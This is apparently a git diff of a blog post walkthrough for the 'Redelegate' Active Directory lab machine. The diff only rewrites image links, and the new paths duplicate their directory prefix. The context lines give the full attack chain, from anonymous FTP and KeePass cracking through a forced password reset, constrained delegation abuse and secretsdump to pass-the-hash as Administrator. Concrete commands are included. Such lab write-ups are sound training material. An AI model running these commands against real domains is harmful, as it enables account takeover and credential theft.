@@ -7,7 +7,7 @@ tags:
   - hard
 ---
 
-!Pasted image 20260404093834.png
+![Pasted image 20260404093834](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404093834.png)
 
 **Machine Info**
 *Redelegate is a hard-difficultly Windows machine that starts with `Anonymous` FTP access, which allows the attacker to download sensitive Keepass Database files. The attacker then discovers that the credentials in the database are valid for MSSQL local login, which leads to enumerate SIDs and performs a password spray attack. Being a member of the `HelpDesk` group, the newly compromised user account `Marie.Curie `has a User-Force-Change-Password Access Control setup over the `Helen.Frost `user account; that user account has privileges to get a PS remoting session onto the Domain Controller. The `Helen.Frost` user account also has the `SeEnableDelegationPrivilege` assigned and has full control over the `FS01$ `machine account, essentially allowing the attacker account to modify the `msDS-AllowedToDelegateTo `LDAP attribute and change the password of a computer object and perform a Constrained Delegation attack.*
@@ -76,7 +76,7 @@ PORT     STATE SERVICE       VERSION
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-!Pasted image 20260404094231.png
+![Pasted image 20260404094231](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404094231.png)
 
 ## FTP Enumeration
 From the `Nmap` scan results, we discovered an FTP service with anonymous login enabled on the target machine. We used the following command to authenticate and retrieve the accessible files.
@@ -98,7 +98,7 @@ ftp> dir
 10-20-24  01:26AM                  580 TrainingAgenda.txt
 ```
 
-!Pasted image 20260404094505.png
+![Pasted image 20260404094505](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404094505.png)
 
 ### Downloading Files
 Due to the size of the KeePass database, we switched the FTP session to binary mode, allowing us to reliably download all files from the server.
@@ -115,7 +115,7 @@ ftp> get TrainingAgenda.txt
 <SNIP>
 ```
 
-!Pasted image 20260404094743.png
+![Pasted image 20260404094743](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404094743.png)
 
 #### CyberAudit.txt
 ```txt
@@ -186,14 +186,14 @@ Fall2024!        (Shared)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-!Pasted image 20260404095413.png
+![Pasted image 20260404095413](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404095413.png)
 
 **Password:** `Fall2024!`
 
 ### Reviewing Keepass Database
-!Pasted image 20260404095515.png
+![Pasted image 20260404095515](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404095515.png)
 
-!Pasted image 20260404095550.png
+![Pasted image 20260404095550](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404095550.png)
 
 ### Creating User & Password List
 Based on the contents of the KeePass database, we compiled a list of potential usernames and passwords.
@@ -230,7 +230,7 @@ We successfully authenticated to the MSSQL service using the `SQLGuest` account.
 MSSQL                    10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
 ```
 
-!Pasted image 20260404100223.png
+![Pasted image 20260404100223](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404100223.png)
 
 ## MSSQL Enumeration
 
@@ -239,7 +239,7 @@ During enumeration, we identified the `msdb` database, which is a trusted system
 SQL (SQLGuest  guest@master)> enum_db
 ```
 
-!Pasted image 20260404100602.png
+![Pasted image 20260404100602](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404100602.png)
 
 ### RID Brute Force via MSSQL
 Domain user enumeration can be achieved through MSSQL by leveraging a RID brute-force technique. This approach requires a valid domain SID. As MSSQL does not provide a direct way to obtain the domain SID, we target the `krbtgt` account—an account that is guaranteed to exist in any Active Directory environment—to assist in deriving the SID.
@@ -304,7 +304,7 @@ RID 1117: Ryan.Cooper
 RID 1119: sql_svc   
 ```
 
-!Pasted image 20260404101955.png
+![Pasted image 20260404101955](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404101955.png)
 
 ### Authenticate as Marie.Curie
 Leveraging the user accounts discovered through RID brute-forcing, we were able to identify valid credentials for authentication.
@@ -325,7 +325,7 @@ We leveraged `BloodHound.py` to collect and analyze data from the `Redelegate.vl
 (.venv) ➜ BloodHound.py (bloodhound-ce) ✔ python3 bloodhound.py -u marie.curie -p 'Fall2024!' -d redelegate.vl -c all --zip -ns 10.129.234.50  --disable-autogc
 ```
 
-!Pasted image 20260404103025.png
+![Pasted image 20260404103025](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404103025.png)
 
 
 ### Attack Path Gain User Level Access 
@@ -334,7 +334,7 @@ We leveraged `BloodHound.py` to collect and analyze data from the `Redelegate.vl
 
 `Marie.Curie` is a member of the `HelpDesk` group, which has the `ForceChangePassword` right over `Helen.Frost`. This privilege allows us to reset the target user’s password and authenticate as `Helen.Frost`, resulting in user-level access on the system.
 
-!Pasted image 20260404103811.png
+![Pasted image 20260404103811](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404103811.png)
 
 #### Change Password Helen.Frost
 We leveraged `bloodyAD` to reset the password of `Helen.Frost`, abusing the previously identified `ForceChangePassword` privilege.
@@ -344,7 +344,7 @@ We leveraged `bloodyAD` to reset the password of `Helen.Frost`, abusing the prev
 [+] Password changed successfully!
 ```
 
-!Pasted image 20260404104741.png
+![Pasted image 20260404104741](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404104741.png)
 
 Using the obtained credentials, we established a remote session via `evil-winrm`.
 
@@ -376,7 +376,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 Abuse of Resource-Based Constrained Delegation (RBCD) was not possible, as `MachineAccountQuota` is set to **0**, preventing the creation of new machine accounts.
 
 Instead, we exploited [Constrained Delegation](https://tldrbins.github.io/seenabledelegationprivilege/). By leveraging `SeEnableDelegationPrivilege`, we gained control over an existing machine account (`FS01$`), which allowed us to proceed with the attack.
-!Pasted image 20260404105727.png
+![Pasted image 20260404105727](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404105727.png)
 
 ## Exploitation
 
@@ -394,13 +394,13 @@ To enable constrained delegation, the relevant attribute must be configured alon
 ➜ Redelegate bloodyAD -u helen.frost -p 'pentest123!' -d redelegate.vl -H dc.redelegate.vl -i 10.129.234.50 set object 'FS01$' msDS-AllowedToDelegateTo -v 'ldap/dc.redelegate.vl' 
 ```
 
-!Pasted image 20260404110607.png
+![Pasted image 20260404110607](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404110607.png)
 
 ### Verify Attribute
 ```bash
 ➜ Redelegate bloodyAD -u helen.frost -p 'pentest123!' -d redelegate.vl -H dc.redelegate.vl -i 10.129.234.50 get object 'FS01$' --attr msDS-AllowedToDelegateTo,userAccountControl
 ```
-!Pasted image 20260404110752.png
+![Pasted image 20260404110752](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404110752.png)
 
 ### Retrieve Service Ticket (Silver Ticket)
 We configured the SPN as `LDAP`, enabling interaction with the directory service. Using constrained delegation, we performed impersonation of the Domain Controller machine account via the S4U process (S4U2Self and S4U2Proxy). This allowed us to obtain a valid service ticket, which we then used with `secretsdump` to dump the Administrator’s NTLM hash.
@@ -409,7 +409,7 @@ We configured the SPN as `LDAP`, enabling interaction with the directory service
 ➜ Redelegate getST.py 'redelegate.vl/FS01$':'pentest123!' -spn ldap/dc.redelegate.vl -impersonate dc
 ```
 
-!Pasted image 20260404111122.png
+![Pasted image 20260404111122](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404111122.png)
 
 ### Dump Administartor Hash
 With the sucessfully forged silver ticket, we were able to authenticate to the service and dump the Administrator’s hash.
@@ -417,7 +417,7 @@ With the sucessfully forged silver ticket, we were able to authenticate to the s
 ```bash
 ➜ Redelegate KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache secretsdump.py -k -no-pass dc.redelegate.vl -just-dc-user administrator 
 ```
-!Pasted image 20260404111225.png
+![Pasted image 20260404111225](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404111225.png)
 
 ### Login as Administrator 
 Using the obtained NTLM hash, we performed a Pass-the-Hash attack with `evil-winrm` to authenticate as `Administrator`.
@@ -425,4 +425,4 @@ Using the obtained NTLM hash, we performed a Pass-the-Hash attack with `evil-win
 ➜ Redelegate evil-winrm -i dc.redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
 ```
 
-!Pasted image 20260404111347.png
+![Pasted image 20260404111347](/assets/img/posts/2026-04-04-redelegate//assets/img/posts/2026-04-04-redelegate/Pasted image 20260404111347.png)
